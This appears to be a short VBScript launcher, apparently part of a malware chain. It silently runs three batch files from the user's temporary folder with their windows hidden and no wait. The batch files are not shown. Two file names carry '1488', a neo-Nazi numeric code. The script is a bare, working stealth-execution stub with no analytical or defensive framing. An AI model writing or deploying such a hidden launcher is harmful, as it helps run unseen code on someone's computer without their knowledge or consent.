Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "%TEMP%\1488.bat", 0, False
WshShell.Run "%TEMP%\1488p2.bat", 0, False
WshShell.Run "%TEMP%\groh10.bat", 0, False